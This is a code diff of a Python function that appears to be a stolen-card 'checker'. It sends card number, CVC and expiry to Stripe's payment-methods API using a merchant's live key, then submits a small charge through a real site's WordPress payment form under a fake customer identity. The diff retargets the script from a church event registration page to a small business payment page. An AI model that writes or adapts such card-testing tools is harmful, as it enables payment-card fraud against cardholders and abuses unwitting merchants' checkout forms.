@@ -26,25 +26,27 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51MlYdjAD3HwNSgHziNbNLIi8Mq04rWRxSiCaOasxEyCaPJdicTar62m3VUK3kYpeB8yhf30V9FVQ14gk8KgGd5UW00vhKk5s5g'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F6998fecf74%3B+stripe-js-v3%2F6998fecf74%3B+card-element&key=pk_live_51QOSGsBSdD240uQEHRbI1Uoe2VKOKidFPq0TQfyr1SPXwD7CyZkMDsO4t7M0IzB584DJlx4ze75fYe96AYJxxu4S00rEgTnmeR'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '__stripe_mid': '21a2d9a1-df64-4652-be2b-d342821aee32378e02',
-	    '__stripe_sid': '53854a56-d7a0-4c82-aab2-b2ea982ee7e0349341',
+	    '_ga': 'GA1.1.1597466595.1740096794',
+	    '__stripe_mid': 'fa860ab2-0e78-4a8e-b532-26acdba570ab427469',
+	    '__stripe_sid': '163d3db2-5634-43db-9d7e-1f93b4020a1b6c5307',
+	    '_ga_WCQ2FKT7F4': 'GS1.1.1740096793.1.1.1740096896.0.0.0',
 	}
 	
 	headers = {
-	    'authority': 'pentecost.familyfed.eu',
+	    'authority': 'tucsonmarketingdirect.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '__stripe_mid=21a2d9a1-df64-4652-be2b-d342821aee32378e02; __stripe_sid=53854a56-d7a0-4c82-aab2-b2ea982ee7e0349341',
-	    'origin': 'https://pentecost.familyfed.eu',
-	    'referer': 'https://pentecost.familyfed.eu/register-for-the-event/',
+	    # 'cookie': '_ga=GA1.1.1597466595.1740096794; __stripe_mid=fa860ab2-0e78-4a8e-b532-26acdba570ab427469; __stripe_sid=163d3db2-5634-43db-9d7e-1f93b4020a1b6c5307; _ga_WCQ2FKT7F4=GS1.1.1740096793.1.1.1740096896.0.0.0',
+	    'origin': 'https://tucsonmarketingdirect.com',
+	    'referer': 'https://tucsonmarketingdirect.com/make-a-payment/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -55,18 +57,15 @@ def Tele(ccx):
 	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	params = {
-	    't': '1740058039381',
+	data = {
+	    'action': 'wpf_submit_form',
+	    'form_id': '1763',
+	    'payment_total': '100',
+	    'form_data': '__wpf_form_id=1763&__wpf_current_url=https%3A%2F%2Ftucsonmarketingdirect.com%2Fmake-a-payment&__wpf_current_page_id=1688&customer_name_1=Rodam%20User&customer_email_1=rodamuser20%40gmail.com&address_input%5Baddress_line_1%5D=Street%2027&address_input%5Baddress_line_2%5D=&address_input%5Bcity%5D=New%20York&address_input%5Bstate%5D=New%20York&address_input%5Bzip_code%5D=10080&address_input%5Bcountry%5D=US&custom_payment_input=1&__stripe_payment_method_id='+str(pm)+'',
+	    'tax_total': '0',
+	    'main_total': '100',
 	}
 	
-	data = 'data=__fluent_form_embded_post_id%3D474%26_fluentform_3_fluentformnonce%3D5803356b7e%26_wp_http_referer%3D%252Fregister-for-the-event%252F%26names%255Bfirst_name%255D%3DRodam%26names%255Bmiddle_name%255D%3D%26names%255Blast_name%255D%3DUser%26email%3Drodamuser20%2540gmail.com%26phone%3D%26country-list%3DAS%26payment_input_7%3DI%2520am%2520coming%2520with%2520my%2520sibling%252Ffriend%2520(Select%2520below)%26payment_input_4%3D20%26item-quantity%3D%26description%3D%26payment_input%3DOther%2520amount%26custom-payment-amount%3D1.00%26gdpr-agreement%3Don%26terms-n-condition%3Don%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=3'
-	
-	r2 = requests.post(
-	    'https://pentecost.familyfed.eu/wp-admin/admin-ajax.php',
-	    params=params,
-	    cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
+	r2 = requests.post('https://tucsonmarketingdirect.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
 	
 	return (r2.json())
